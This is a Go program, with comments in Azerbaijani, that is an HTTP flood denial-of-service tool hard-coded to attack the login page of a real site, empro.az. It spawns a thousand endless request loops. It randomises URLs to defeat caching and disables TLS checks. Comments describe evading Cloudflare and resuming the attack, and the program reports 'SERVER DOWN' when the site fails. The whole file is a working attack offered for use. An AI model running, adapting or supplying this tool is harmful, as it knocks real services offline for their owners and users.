package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

func main() {
	target := "https://empro.az/#/login"
	workers := 1000 // Railway gücünə görə 2000-ə qədər qaldırın
	
	fmt.Printf("[!] Go-X-Force Başlayır: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			// Müasir brauzer TLS versiyasını təqlid edirik
			MinVersion: tls.VersionTLS12,
		},
		MaxIdleConns:        5000,
		MaxIdleConnsPerHost: 2000,
		// Cloudflare-in bağlantını kəsməsinə icazə verməmək üçün
		DisableKeepAlives: false,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Cache-i deşib keçmək üçün hər saniyə fərqli URL-lər
				u := fmt.Sprintf("%s/?bypass=%d_%d", target, rand.Intn(999999), time.Now().UnixNano())
				
				req, _ := http.NewRequest("GET", u, nil)
				
				// Realist başlıqlar
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				
				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						fmt.Printf("[W-%d] SERVER DOWN: %d\n", id, resp.StatusCode)
					} else {
						fmt.Printf("[W-%d] Sent\n", id)
					}
					resp.Body.Close()
				} else {
                    // Bağlantı çətinləşəndə qısa gözləyib təkrar hücum
                    time.Sleep(10 * time.Millisecond)
                }
			}
		}(i)
	}
	wg.Wait()
}
